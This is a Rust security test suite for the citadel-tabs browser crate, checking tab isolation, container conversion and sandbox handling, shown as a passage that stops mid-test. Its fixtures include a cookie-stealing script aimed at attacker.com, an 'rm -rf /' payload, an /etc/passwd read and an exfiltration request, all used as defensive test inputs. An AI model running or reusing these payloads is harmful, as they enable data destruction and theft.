//! Comprehensive security tests for the citadel-tabs crate
//!
//! This test suite validates all tab security functionality including:
//! - ZKVM tab isolation and security guarantees
//! - Cross-tab data protection and isolation
//! - Tab conversion security (ephemeral to container)
//! - Send-safe tab manager security
//! - Tab persistence security
//! - ZKVM renderer security validation
//! - Memory isolation between tabs
//! - Attack scenario prevention

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::timeout;
use uuid::Uuid;

use citadel_tabs::{
    Tab, TabState, TabType, PageContent, TabError, TabResult,
    SendSafeTabManager, SimpleTab, SimpleTabManager,
};
use citadel_zkvm::{Channel, ChannelMessage};

/// Test utilities for tab security testing
mod test_utils {
    use super::*;
    
    /// Create a test tab state with specific properties
    pub fn create_test_tab_state(
        url: &str,
        tab_type: TabType,
        is_active: bool,
    ) -> TabState {
        TabState {
            id: Uuid::new_v4(),
            title: format!("Test Tab - {}", url),
            url: url.to_string(),
            tab_type,
            is_active,
            created_at: chrono::Utc::now(),
            content: PageContent::Loading { url: url.to_string() },
        }
    }
    
    /// Create a container tab type for testing
    pub fn create_container_tab_type() -> TabType {
        TabType::Container {
            container_id: Uuid::new_v4(),
        }
    }
    
    /// Create test page content with security-sensitive data
    pub fn create_sensitive_page_content() -> PageContent {
        PageContent::Loaded {
            url: "https://bank.example.com/account".to_string(),
            title: "Bank Account - Sensitive".to_string(),
            content: "Account balance: $10,000. SSN: 123-45-6789".to_string(),
            element_count: 50,
            size_bytes: 2048,
        }
    }
    
    /// Create malicious page content for testing
    pub fn create_malicious_page_content() -> PageContent {
        PageContent::Loaded {
            url: "https://evil.com/malware".to_string(),
            title: "Malicious Page".to_string(),
            content: "<script>window.location='https://attacker.com/steal?data='+document.cookie</script>".to_string(),
            element_count: 10,
            size_bytes: 512,
        }
    }
    
    /// Create a malicious ZKVM message for testing
    pub fn create_malicious_zkvm_message() -> ChannelMessage {
        ChannelMessage::Control {
            command: "break_sandbox".to_string(),
            params: r#"{"target": "host_system", "payload": "rm -rf /"}"#.to_string(),
        }
    }
    
    /// Verify tab isolation by checking no shared state
    pub async fn verify_tab_isolation(tab1_id: Uuid, tab2_id: Uuid, manager: &SendSafeTabManager) {
        let tab_states = manager.get_tab_states();
        
        let tab1_state = tab_states.iter().find(|t| t.id == tab1_id);
        let tab2_state = tab_states.iter().find(|t| t.id == tab2_id);
        
        assert!(tab1_state.is_some(), "Tab 1 should exist");
        assert!(tab2_state.is_some(), "Tab 2 should exist");
        
        let tab1 = tab1_state.unwrap();
        let tab2 = tab2_state.unwrap();
        
        // Tabs should have different IDs
        assert_ne!(tab1.id, tab2.id);
        
        // Container tabs should have different container IDs
        if let (TabType::Container { container_id: id1 }, TabType::Container { container_id: id2 }) = 
            (&tab1.tab_type, &tab2.tab_type) {
            assert_ne!(id1, id2, "Container tabs should have different container IDs");
        }
    }
}

#[cfg(test)]
mod tab_state_tests {
    use super::*;
    use test_utils::*;

    #[test]
    fn test_tab_state_creation() {
        let tab_state = create_test_tab_state(
            "https://example.com",
            TabType::Ephemeral,
            true,
        );
        
        assert_eq!(tab_state.url, "https://example.com");
        assert_eq!(tab_state.tab_type, TabType::Ephemeral);
        assert!(tab_state.is_active);
        assert!(matches!(tab_state.content, PageContent::Loading { .. }));
    }

    #[test]
    fn test_tab_type_security_properties() {
        let ephemeral_tab = TabType::Ephemeral;
        let container_tab = create_container_tab_type();
        
        // Ephemeral tabs should not persist
        assert_eq!(ephemeral_tab, TabType::Ephemeral);
        
        // Container tabs should have unique IDs
        let another_container = create_container_tab_type();
        if let (TabType::Container { container_id: id1 }, TabType::Container { container_id: id2 }) = 
            (&container_tab, &another_container) {
            assert_ne!(id1, id2, "Container IDs should be unique");
        }
    }

    #[test]
    fn test_page_content_security_classification() {
        let sensitive_content = create_sensitive_page_content();
        let malicious_content = create_malicious_page_content();
        
        // Verify content types are properly classified
        if let PageContent::Loaded { url, content, .. } = &sensitive_content {
            assert!(url.contains("bank.example.com"));
            assert!(content.contains("Account balance"));
        }
        
        if let PageContent::Loaded { content, .. } = &malicious_content {
            assert!(content.contains("<script>"));
            assert!(content.contains("attacker.com"));
        }
    }

    #[test]
    fn test_tab_state_serialization_security() {
        // Test that sensitive data in tab states can be serialized safely
        let tab_state = TabState {
            id: Uuid::new_v4(),
            title: "Sensitive Bank Page".to_string(),
            url: "https://bank.com/account".to_string(),
            tab_type: TabType::Ephemeral,
            is_active: true,
            created_at: chrono::Utc::now(),
            content: create_sensitive_page_content(),
        };
        
        // Should be able to serialize/deserialize without losing security properties
        let serialized = serde_json::to_string(&tab_state).expect("Should serialize");
        let deserialized: TabState = serde_json::from_str(&serialized).expect("Should deserialize");
        
        assert_eq!(tab_state.id, deserialized.id);
        assert_eq!(tab_state.tab_type, deserialized.tab_type);
        
        // Sensitive content should be preserved but not leaked
        if let (PageContent::Loaded { content: orig, .. }, PageContent::Loaded { content: deser, .. }) = 
            (&tab_state.content, &deserialized.content) {
            assert_eq!(orig, deser);
        }
    }
}

#[cfg(test)]
mod simple_tab_manager_tests {
    use super::*;
    use test_utils::*;

    #[test]
    fn test_simple_tab_manager_creation() {
        let manager = SimpleTabManager::new();
        
        assert_eq!(manager.tab_count(), 0);
        assert!(manager.active_tab().is_none());
        assert!(manager.all_tabs().is_empty());
    }

    #[test]
    fn test_simple_tab_isolation() {
        let manager = SimpleTabManager::new();
        
        // Create multiple tabs
        let tab1_id = manager.create_tab("https://site1.com".to_string());
        let tab2_id = manager.create_tab("https://site2.com".to_string());
        let tab3_id = manager.create_tab("https://site3.com".to_string());
        
        assert_eq!(manager.tab_count(), 3);
        assert_ne!(tab1_id, tab2_id);
        assert_ne!(tab2_id, tab3_id);
        
        // First tab should be active
        let active_tab = manager.active_tab().unwrap();
        assert_eq!(active_tab.id(), tab1_id);
        
        // Tabs should have different URLs
        let tab1 = manager.get_tab(tab1_id).unwrap();
        let tab2 = manager.get_tab(tab2_id).unwrap();
        
        assert_eq!(tab1.url(), "https://site1.com");
        assert_eq!(tab2.url(), "https://site2.com");
        assert_ne!(tab1.url(), tab2.url());
    }

    #[test]
    fn test_simple_tab_data_isolation() {
        let manager = SimpleTabManager::new();
        
        let tab1_id = manager.create_tab("https://example.com".to_string());
        let tab2_id = manager.create_tab("https://example.com".to_string()); // Same URL, different tab
        
        let tab1 = manager.get_tab(tab1_id).unwrap();
        let tab2 = manager.get_tab(tab2_id).unwrap();
        
        // Even with same URL, tabs should be isolated
        assert_ne!(tab1.id(), tab2.id());
        
        // Modify one tab's data
        tab1.set_title("Modified Tab 1".to_string());
        tab1.set_loading(true);
        
        // Other tab should not be affected
        assert_ne!(tab1.title(), tab2.title());
        assert_ne!(tab1.is_loading(), tab2.is_loading());
    }

    #[test]
    fn test_simple_tab_active_switching_security() {
        let manager = SimpleTabManager::new();
        
        let tab1_id = manager.create_tab("https://bank.com".to_string());
        let tab2_id = manager.create_tab("https://social.com".to_string());
        
        // First tab should be active
        assert_eq!(manager.active_tab().unwrap().id(), tab1_id);
        
        // Switch to second tab
        assert!(manager.set_active_tab(tab2_id));
        assert_eq!(manager.active_tab().unwrap().id(), tab2_id);
        
        // Cannot switch to non-existent tab
        let fake_id = Uuid::new_v4();
        assert!(!manager.set_active_tab(fake_id));
        
        // Active tab should remain unchanged
        assert_eq!(manager.active_tab().unwrap().id(), tab2_id);
    }

    #[test]
    fn test_simple_tab_closing_security() {
        let manager = SimpleTabManager::new();
        
        let tab1_id = manager.create_tab("https://sensitive.com".to_string());
        let tab2_id = manager.create_tab("https://public.com".to_string());
        
        // Set sensitive data in tab1
        let tab1 = manager.get_tab(tab1_id).unwrap();
        tab1.set_title("Sensitive Banking Data".to_string());
        
        // Close tab1
        assert!(manager.close_tab(tab1_id));
        
        // Tab1 should no longer exist
        assert!(manager.get_tab(tab1_id).is_none());
        assert_eq!(manager.tab_count(), 1);
        
        // Tab2 should be unaffected
        let tab2 = manager.get_tab(tab2_id).unwrap();
        assert_eq!(tab2.url(), "https://public.com");
        
        // Active tab should switch to remaining tab
        assert_eq!(manager.active_tab().unwrap().id(), tab2_id);
    }
}

#[cfg(test)]
mod send_safe_tab_manager_tests {
    use super::*;
    use test_utils::*;

    #[tokio::test]
    async fn test_send_safe_tab_manager_creation() {
        let manager = SendSafeTabManager::new();
        
        let tab_states = manager.get_tab_states();
        assert!(tab_states.is_empty());
    }

    #[tokio::test]
    async fn test_zkvm_tab_creation() {
        let manager = SendSafeTabManager::new();
        
        // Create ephemeral tab
        let result = manager.open_tab(
            "https://example.com".to_string(),
            TabType::Ephemeral,
        ).await;
        
        assert!(result.is_ok());
        let tab_id = result.unwrap();
        
        let tab_states = manager.get_tab_states();
        assert_eq!(tab_states.len(), 1);
        
        let tab_state = &tab_states[0];
        assert_eq!(tab_state.id, tab_id);
        assert_eq!(tab_state.url, "https://example.com");
        assert_eq!(tab_state.tab_type, TabType::Ephemeral);
        assert!(tab_state.is_active); // First tab should be active
    }

    #[tokio::test]
    async fn test_zkvm_tab_isolation() {
        let manager = SendSafeTabManager::new();
        
        // Create multiple tabs with different content
        let tab1_result = manager.open_tab(
            "https://bank.com".to_string(),
            TabType::Ephemeral,
        ).await;
        let tab2_result = manager.open_tab(
            "https://social.com".to_string(),
            TabType::Ephemeral,
        ).await;
        
        assert!(tab1_result.is_ok());
        assert!(tab2_result.is_ok());
        
        let tab1_id = tab1_result.unwrap();
        let tab2_id = tab2_result.unwrap();
        
        // Verify isolation
        verify_tab_isolation(tab1_id, tab2_id, &manager).await;
        
        // Update content in one tab
        let sensitive_content = create_sensitive_page_content();
        let result = manager.update_page_content(tab1_id, sensitive_content.clone()).await;
        assert!(result.is_ok());
        
        // Verify the other tab is not affected
        let tab_states = manager.get_tab_states();
        let tab1_state = tab_states.iter().find(|t| t.id == tab1_id).unwrap();
        let tab2_state = tab_states.iter().find(|t| t.id == tab2_id).unwrap();
        
        // Tab1 should have updated content
        if let PageContent::Loaded { content, .. } = &tab1_state.content {
            assert!(content.contains("Account balance"));
        }
        
        // Tab2 should have different content
        assert_ne!(tab1_state.content, tab2_state.content);
    }

    #[tokio::test]
    async fn test_tab_conversion_security() {
        let manager = SendSafeTabManager::new();
        
        // Create ephemeral tab
        let tab_id = manager.open_tab(
            "https://example.com".to_string(),
            TabType::Ephemeral,
        ).await.unwrap();
        
        // Convert to container
        let result = manager.convert_to_container(tab_id).await;
        assert!(result.is_ok());
        
        // Verify conversion
        let tab_states = manager.get_tab_states();
        let tab_state = tab_states.iter().find(|t| t.id == tab_id).unwrap();
        
        if let TabType::Container { container_id } = tab_state.tab_type {
            assert_ne!(container_id, Uuid::nil());
        } else {
            panic!("Tab should be converted to container");
        }
        
        // Try to convert again (should fail)
        let second_result = manager.convert_to_container(tab_id).await;
        assert!(second_result.is_err());
        match second_result.unwrap_err() {
            TabError::InvalidOperation(msg) => {
                assert!(msg.contains("already a container"));
            }
            _ => panic!("Expected InvalidOperation error"),
        }
    }

    #[tokio::test]
    async fn test_tab_switching_security() {
        let manager = SendSafeTabManager::new();
        
        // Create multiple tabs
        let tab1_id = manager.open_tab("https://site1.com".to_string(), TabType::Ephemeral).await.unwrap();
        let tab2_id = manager.open_tab("https://site2.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // First tab should be active
        let initial_states = manager.get_tab_states();
        assert!(initial_states.iter().find(|t| t.id == tab1_id).unwrap().is_active);
        assert!(!initial_states.iter().find(|t| t.id == tab2_id).unwrap().is_active);
        
        // Switch to second tab
        let result = manager.switch_tab(tab2_id).await;
        assert!(result.is_ok());
        
        // Verify switch
        let updated_states = manager.get_tab_states();
        assert!(!updated_states.iter().find(|t| t.id == tab1_id).unwrap().is_active);
        assert!(updated_states.iter().find(|t| t.id == tab2_id).unwrap().is_active);
        
        // Try to switch to non-existent tab
        let fake_id = Uuid::new_v4();
        let invalid_result = manager.switch_tab(fake_id).await;
        assert!(invalid_result.is_err());
        match invalid_result.unwrap_err() {
            TabError::NotFound(id) => assert_eq!(id, fake_id),
            _ => panic!("Expected NotFound error"),
        }
    }

    #[tokio::test]
    async fn test_tab_closing_zkvm_cleanup() {
        let manager = SendSafeTabManager::new();
        
        // Create tab with sensitive content
        let tab_id = manager.open_tab("https://bank.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        let sensitive_content = create_sensitive_page_content();
        manager.update_page_content(tab_id, sensitive_content).await.unwrap();
        
        // Verify tab exists
        let states_before = manager.get_tab_states();
        assert_eq!(states_before.len(), 1);
        
        // Close tab
        let result = manager.close_tab(tab_id).await;
        assert!(result.is_ok());
        
        // Verify tab is completely removed
        let states_after = manager.get_tab_states();
        assert!(states_after.is_empty());
        
        // Verify ZKVM resources are cleaned up (by ensuring we can't interact with the tab)
        let update_result = manager.update_page_content(tab_id, PageContent::Empty).await;
        assert!(update_result.is_err());
        match update_result.unwrap_err() {
            TabError::NotFound(id) => assert_eq!(id, tab_id),
            _ => panic!("Expected NotFound error"),
        }
    }

    #[tokio::test]
    async fn test_zkvm_message_sending_security() {
        let manager = SendSafeTabManager::new();
        
        let tab_id = manager.open_tab("https://example.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Send legitimate message
        let legitimate_message = ChannelMessage::Control {
            command: "update_content".to_string(),
            params: r#"{"url": "https://example.com"}"#.to_string(),
        };
        
        let result = manager.send_message_to_tab(tab_id, legitimate_message).await;
        assert!(result.is_ok());
        
        // Try to send malicious message
        let malicious_message = create_malicious_zkvm_message();
        
        // Even if we send it, the ZKVM should isolate and prevent execution
        let malicious_result = manager.send_message_to_tab(tab_id, malicious_message).await;
        
        // The message sending should succeed (it's the ZKVM's job to sandbox)
        // but we verify the tab state isn't compromised
        assert!(malicious_result.is_ok());
        
        // Verify tab state is still secure
        let tab_states = manager.get_tab_states();
        let tab_state = tab_states.iter().find(|t| t.id == tab_id).unwrap();
        assert_eq!(tab_state.url, "https://example.com");
        
        // Try to send to non-existent tab
        let fake_id = Uuid::new_v4();
        let fake_message = ChannelMessage::Control {
            command: "test".to_string(),
            params: "{}".to_string(),
        };
        
        let fake_result = manager.send_message_to_tab(fake_id, fake_message).await;
        assert!(fake_result.is_err());
    }
}

#[cfg(test)]
mod tab_isolation_tests {
    use super::*;
    use test_utils::*;

    #[tokio::test]
    async fn test_memory_isolation_between_tabs() {
        let manager = SendSafeTabManager::new();
        
        // Create tabs with different memory requirements
        let small_tab = manager.open_tab("https://simple.com".to_string(), TabType::Ephemeral).await.unwrap();
        let large_tab = manager.open_tab("https://complex.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Simulate different memory usage patterns
        let small_content = PageContent::Loaded {
            url: "https://simple.com".to_string(),
            title: "Simple Page".to_string(),
            content: "Hello World".to_string(),
            element_count: 5,
            size_bytes: 100,
        };
        
        let large_content = PageContent::Loaded {
            url: "https://complex.com".to_string(),
            title: "Complex Page".to_string(),
            content: "x".repeat(10000), // Large content
            element_count: 1000,
            size_bytes: 50000,
        };
        
        manager.update_page_content(small_tab, small_content).await.unwrap();
        manager.update_page_content(large_tab, large_content).await.unwrap();
        
        // Verify isolation - each tab should have its own memory space
        let tab_states = manager.get_tab_states();
        let small_state = tab_states.iter().find(|t| t.id == small_tab).unwrap();
        let large_state = tab_states.iter().find(|t| t.id == large_tab).unwrap();
        
        if let (PageContent::Loaded { size_bytes: small_size, .. }, 
                PageContent::Loaded { size_bytes: large_size, .. }) = 
            (&small_state.content, &large_state.content) {
            assert!(small_size < large_size);
            assert_eq!(*small_size, 100);
            assert_eq!(*large_size, 50000);
        }
    }

    #[tokio::test]
    async fn test_cross_tab_data_leakage_prevention() {
        let manager = SendSafeTabManager::new();
        
        // Create tab with sensitive data
        let sensitive_tab = manager.open_tab("https://bank.com".to_string(), TabType::Ephemeral).await.unwrap();
        let public_tab = manager.open_tab("https://news.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Add sensitive content to first tab
        let sensitive_content = create_sensitive_page_content();
        manager.update_page_content(sensitive_tab, sensitive_content).await.unwrap();
        
        // Add public content to second tab
        let public_content = PageContent::Loaded {
            url: "https://news.com".to_string(),
            title: "Public News".to_string(),
            content: "Latest news updates".to_string(),
            element_count: 20,
            size_bytes: 1024,
        };
        manager.update_page_content(public_tab, public_content).await.unwrap();
        
        // Verify no data leakage between tabs
        let tab_states = manager.get_tab_states();
        let sensitive_state = tab_states.iter().find(|t| t.id == sensitive_tab).unwrap();
        let public_state = tab_states.iter().find(|t| t.id == public_tab).unwrap();
        
        // Sensitive data should only be in sensitive tab
        if let PageContent::Loaded { content: sensitive_content, .. } = &sensitive_state.content {
            assert!(sensitive_content.contains("Account balance"));
            assert!(sensitive_content.contains("SSN"));
        }
        
        // Public tab should not contain sensitive data
        if let PageContent::Loaded { content: public_content, .. } = &public_state.content {
            assert!(!public_content.contains("Account balance"));
            assert!(!public_content.contains("SSN"));
            assert!(public_content.contains("Latest news"));
        }
    }

    #[tokio::test]
    async fn test_container_tab_isolation() {
        let manager = SendSafeTabManager::new();
        
        // Create multiple container tabs
        let container1 = manager.open_tab("https://app1.com".to_string(), TabType::Ephemeral).await.unwrap();
        let container2 = manager.open_tab("https://app2.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Convert both to containers
        manager.convert_to_container(container1).await.unwrap();
        manager.convert_to_container(container2).await.unwrap();
        
        // Verify containers have different IDs
        let tab_states = manager.get_tab_states();
        let container1_state = tab_states.iter().find(|t| t.id == container1).unwrap();
        let container2_state = tab_states.iter().find(|t| t.id == container2).unwrap();
        
        if let (TabType::Container { container_id: id1 }, TabType::Container { container_id: id2 }) = 
            (&container1_state.tab_type, &container2_state.tab_type) {
            assert_ne!(id1, id2, "Container tabs should have unique container IDs");
        }
        
        // Add different data to each container
        let app1_content = PageContent::Loaded {
            url: "https://app1.com".to_string(),
            title: "App 1 Data".to_string(),
            content: "App 1 specific data and state".to_string(),
            element_count: 30,
            size_bytes: 1500,
        };
        
        let app2_content = PageContent::Loaded {
            url: "https://app2.com".to_string(),
            title: "App 2 Data".to_string(),
            content: "App 2 specific data and state".to_string(),
            element_count: 25,
            size_bytes: 1200,
        };
        
        manager.update_page_content(container1, app1_content).await.unwrap();
        manager.update_page_content(container2, app2_content).await.unwrap();
        
        // Verify isolation between containers
        let updated_states = manager.get_tab_states();
        let updated_container1 = updated_states.iter().find(|t| t.id == container1).unwrap();
        let updated_container2 = updated_states.iter().find(|t| t.id == container2).unwrap();
        
        assert_ne!(updated_container1.content, updated_container2.content);
        
        if let PageContent::Loaded { content: content1, .. } = &updated_container1.content {
            assert!(content1.contains("App 1 specific"));
            assert!(!content1.contains("App 2 specific"));
        }
        
        if let PageContent::Loaded { content: content2, .. } = &updated_container2.content {
            assert!(content2.contains("App 2 specific"));
            assert!(!content2.contains("App 1 specific"));
        }
    }

    #[tokio::test]
    async fn test_ephemeral_tab_data_disposal() {
        let manager = SendSafeTabManager::new();
        
        // Create ephemeral tab with sensitive data
        let ephemeral_tab = manager.open_tab("https://temp.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        let temp_sensitive_content = PageContent::Loaded {
            url: "https://temp.com".to_string(),
            title: "Temporary Sensitive Data".to_string(),
            content: "Temporary session token: abc123xyz".to_string(),
            element_count: 10,
            size_bytes: 500,
        };
        
        manager.update_page_content(ephemeral_tab, temp_sensitive_content).await.unwrap();
        
        // Verify data exists
        let states_before = manager.get_tab_states();
        let state_before = states_before.iter().find(|t| t.id == ephemeral_tab).unwrap();
        if let PageContent::Loaded { content, .. } = &state_before.content {
            assert!(content.contains("session token"));
        }
        
        // Close ephemeral tab
        manager.close_tab(ephemeral_tab).await.unwrap();
        
        // Verify all data is disposed of
        let states_after = manager.get_tab_states();
        assert!(states_after.iter().find(|t| t.id == ephemeral_tab).is_none());
        
        // Create new tab to verify no data persistence
        let new_tab = manager.open_tab("https://temp.com".to_string(), TabType::Ephemeral).await.unwrap();
        let new_states = manager.get_tab_states();
        let new_state = new_states.iter().find(|t| t.id == new_tab).unwrap();
        
        // New tab should not have old sensitive data
        if let PageContent::Loading { .. } = &new_state.content {
            // Expected - new tab starts loading
        } else {
            panic!("New ephemeral tab should start with loading content");
        }
    }
}

#[cfg(test)]
mod zkvm_security_tests {
    use super::*;
    use test_utils::*;

    #[tokio::test]
    async fn test_zkvm_renderer_security() {
        let manager = SendSafeTabManager::new();
        
        // Create tab that will have ZKVM renderer
        let tab_id = manager.open_tab("https://test.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // The ZKVM renderer should be automatically started for each tab
        // We can't directly test the ZKVM internals, but we can test the interface
        
        // Send control message to renderer
        let control_message = ChannelMessage::Control {
            command: "render_page".to_string(),
            params: r#"{"html": "<div>Safe content</div>"}"#.to_string(),
        };
        
        let result = manager.send_message_to_tab(tab_id, control_message).await;
        assert!(result.is_ok(), "Should be able to send safe control messages");
        
        // Send resource request
        let resource_message = ChannelMessage::ResourceRequest {
            url: "https://test.com/image.png".to_string(),
            headers: vec![("Accept".to_string(), "image/*".to_string())],
        };
        
        let resource_result = manager.send_message_to_tab(tab_id, resource_message).await;
        assert!(resource_result.is_ok(), "Should be able to send safe resource requests");
    }

    #[tokio::test]
    async fn test_zkvm_sandbox_violation_handling() {
        let manager = SendSafeTabManager::new();
        
        let tab_id = manager.open_tab("https://malicious.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Try to send potentially harmful messages
        let harmful_messages = vec![
            ChannelMessage::Control {
                command: "execute_system_command".to_string(),
                params: r#"{"command": "rm -rf /"}"#.to_string(),
            },
            ChannelMessage::Control {
                command: "access_filesystem".to_string(),
                params: r#"{"path": "/etc/passwd"}"#.to_string(),
            },
            ChannelMessage::Control {
                command: "network_request".to_string(),
                params: r#"{"url": "https://attacker.com/exfiltrate", "data": "stolen_data"}"#.to_string(),
            },
        ];
        
        for message in harmful_messages {
            // The message sending itself might succeed (it's the ZKVM's job to sandbox)
            let result = manager.send_message_to_tab(tab_id, message).await;
            
            // Either the message is rejected or the ZKVM handles it safely
            // We can't break out of the sandbox
            match result {
                Ok(_) => {
                    // If accepted, verify the tab state isn't compromised
                    let tab_states = manager.get_tab_states();
                    let tab_state = tab_states.iter().find(|t| t.id == tab_id).unwrap();
                    assert_eq!(tab_state.url, "https://malicious.com");
                    assert_eq!(tab_state.tab_type, TabType::Ephemeral);
                }
                Err(_) => {
                    // Message was rejected - this is also acceptable
                }
            }
        }
    }

    #[tokio::test]
    async fn test_zkvm_memory_limits() {
        let manager = SendSafeTabManager::new();
        
        let tab_id = manager.open_tab("https://memory-test.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Try to create very large content that might exhaust memory
        let large_content = PageContent::Loaded {
            url: "https://memory-test.com".to_string(),
            title: "Memory Test".to_string(),
            content: "x".repeat(1_000_000), // 1MB of content
            element_count: 100_000,
            size_bytes: 1_000_000,
        };
        
        // The system should handle large content gracefully
        let result = manager.update_page_content(tab_id, large_content).await;
        
        match result {
            Ok(_) => {
                // If accepted, verify it's properly contained
                let tab_states = manager.get_tab_states();
                let tab_state = tab_states.iter().find(|t| t.id == tab_id).unwrap();
                
                if let PageContent::Loaded { size_bytes, .. } = &tab_state.content {
                    assert_eq!(*size_bytes, 1_000_000);
                }
            }
            Err(TabError::InvalidOperation(_)) => {
                // Memory limit exceeded - this is acceptable behavior
            }
            Err(e) => {
                panic!("Unexpected error: {:?}", e);
            }
        }
    }

    #[tokio::test]
    async fn test_zkvm_communication_timeout() {
        let manager = SendSafeTabManager::new();
        
        let tab_id = manager.open_tab("https://timeout-test.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Test that communication doesn't hang indefinitely
        let message = ChannelMessage::Control {
            command: "long_running_operation".to_string(),
            params: r#"{"duration": 10000}"#.to_string(),
        };
        
        // Use timeout to ensure operation completes within reasonable time
        let result = timeout(
            Duration::from_secs(5),
            manager.send_message_to_tab(tab_id, message)
        ).await;
        
        match result {
            Ok(send_result) => {
                // Message was sent within timeout
                assert!(send_result.is_ok() || send_result.is_err());
            }
            Err(_) => {
                // Timeout occurred - this might be expected for some operations
                // The important thing is that we don't hang indefinitely
            }
        }
    }
}

#[cfg(test)]
mod attack_scenario_tests {
    use super::*;
    use test_utils::*;

    #[tokio::test]
    async fn test_tab_confusion_attack_prevention() {
        let manager = SendSafeTabManager::new();
        
        // Create legitimate and malicious tabs
        let legitimate_tab = manager.open_tab("https://bank.com".to_string(), TabType::Ephemeral).await.unwrap();
        let malicious_tab = manager.open_tab("https://bank-phishing.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Add legitimate content
        let legitimate_content = PageContent::Loaded {
            url: "https://bank.com".to_string(),
            title: "Real Bank".to_string(),
            content: "Your account balance: $1000".to_string(),
            element_count: 50,
            size_bytes: 2048,
        };
        
        // Add malicious content that tries to mimic legitimate content
        let malicious_content = PageContent::Loaded {
            url: "https://bank-phishing.com".to_string(),
            title: "Real Bank".to_string(), // Same title as legitimate
            content: "Your account balance: $1000 - Please enter your password".to_string(),
            element_count: 50,
            size_bytes: 2048,
        };
        
        manager.update_page_content(legitimate_tab, legitimate_content).await.unwrap();
        manager.update_page_content(malicious_tab, malicious_content).await.unwrap();
        
        // Verify tabs remain isolated despite similar content
        let tab_states = manager.get_tab_states();
        let legit_state = tab_states.iter().find(|t| t.id == legitimate_tab).unwrap();
        let malicious_state = tab_states.iter().find(|t| t.id == malicious_tab).unwrap();
        
        // URLs should be different (key security property)
        assert_ne!(legit_state.url, malicious_state.url);
        assert_eq!(legit_state.url, "https://bank.com");
        assert_eq!(malicious_state.url, "https://bank-phishing.com");
        
        // Tab IDs should be different
        assert_ne!(legit_state.id, malicious_state.id);
        
        // Malicious tab cannot access legitimate tab's data
        let malicious_message = ChannelMessage::Control {
            command: "steal_data".to_string(),
            params: format!(r#"{{"target_tab": "{}"}}"#, legitimate_tab),
        };
        
        let steal_result = manager.send_message_to_tab(malicious_tab, malicious_message).await;
        
        // Either the message is rejected or it has no effect on the legitimate tab
        let updated_states = manager.get_tab_states();
        let updated_legit_state = updated_states.iter().find(|t| t.id == legitimate_tab).unwrap();
        
        // Legitimate tab should be unchanged
        assert_eq!(updated_legit_state.url, "https://bank.com");
        if let PageContent::Loaded { content, .. } = &updated_legit_state.content {
            assert!(content.contains("Your account balance: $1000"));
            assert!(!content.contains("Please enter your password"));
        }
    }

    #[tokio::test]
    async fn test_session_hijacking_prevention() {
        let manager = SendSafeTabManager::new();
        
        // Create tab with session data
        let session_tab = manager.open_tab("https://secure-app.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        let session_content = PageContent::Loaded {
            url: "https://secure-app.com".to_string(),
            title: "Secure App".to_string(),
            content: "Session ID: secure_session_123".to_string(),
            element_count: 20,
            size_bytes: 1024,
        };
        
        manager.update_page_content(session_tab, session_content).await.unwrap();
        
        // Create another tab that tries to access the session
        let attacker_tab = manager.open_tab("https://attacker.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Attacker tries to access session data
        let hijack_message = ChannelMessage::Control {
            command: "access_session".to_string(),
            params: format!(r#"{{"target_tab": "{}"}}"#, session_tab),
        };
        
        let hijack_result = manager.send_message_to_tab(attacker_tab, hijack_message).await;
        
        // Verify session remains isolated
        let tab_states = manager.get_tab_states();
        let session_state = tab_states.iter().find(|t| t.id == session_tab).unwrap();
        let attacker_state = tab_states.iter().find(|t| t.id == attacker_tab).unwrap();
        
        // Session tab should retain its data
        if let PageContent::Loaded { content: session_content, .. } = &session_state.content {
            assert!(session_content.contains("Session ID: secure_session_123"));
        }
        
        // Attacker tab should not have session data
        if let PageContent::Loading { .. } = &attacker_state.content {
            // Expected - attacker tab starts empty
        } else if let PageContent::Loaded { content: attacker_content, .. } = &attacker_state.content {
            assert!(!attacker_content.contains("secure_session_123"));
        }
    }

    #[tokio::test]
    async fn test_privilege_escalation_prevention() {
        let manager = SendSafeTabManager::new();
        
        // Create unprivileged tab
        let unprivileged_tab = manager.open_tab("https://unprivileged.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        // Try various privilege escalation attempts
        let escalation_attempts = vec![
            ChannelMessage::Control {
                command: "become_container".to_string(),
                params: "{}".to_string(),
            },
            ChannelMessage::Control {
                command: "access_host_filesystem".to_string(),
                params: r#"{"path": "/"}"#.to_string(),
            },
            ChannelMessage::Control {
                command: "modify_tab_manager".to_string(),
                params: "{}".to_string(),
            },
        ];
        
        for attempt in escalation_attempts {
            let result = manager.send_message_to_tab(unprivileged_tab, attempt).await;
            
            // Verify tab type hasn't changed
            let tab_states = manager.get_tab_states();
            let tab_state = tab_states.iter().find(|t| t.id == unprivileged_tab).unwrap();
            assert_eq!(tab_state.tab_type, TabType::Ephemeral);
            assert_eq!(tab_state.url, "https://unprivileged.com");
        }
        
        // Verify only authorized conversion works
        let authorized_result = manager.convert_to_container(unprivileged_tab).await;
        assert!(authorized_result.is_ok());
        
        let final_states = manager.get_tab_states();
        let final_state = final_states.iter().find(|t| t.id == unprivileged_tab).unwrap();
        
        if let TabType::Container { .. } = final_state.tab_type {
            // Authorized conversion succeeded
        } else {
            panic!("Authorized conversion should have succeeded");
        }
    }

    #[tokio::test]
    async fn test_resource_exhaustion_attack_prevention() {
        let manager = SendSafeTabManager::new();
        
        // Try to create many tabs to exhaust resources
        let mut tab_ids = Vec::new();
        
        // Create a reasonable number of tabs
        for i in 0..100 {
            let result = manager.open_tab(
                format!("https://site{}.com", i),
                TabType::Ephemeral,
            ).await;
            
            match result {
                Ok(tab_id) => {
                    tab_ids.push(tab_id);
                }
                Err(_) => {
                    // Resource limit reached - this is expected behavior
                    break;
                }
            }
        }
        
        // Should have created some tabs but not unlimited
        assert!(!tab_ids.is_empty(), "Should be able to create some tabs");
        assert!(tab_ids.len() <= 100, "Should limit number of tabs");
        
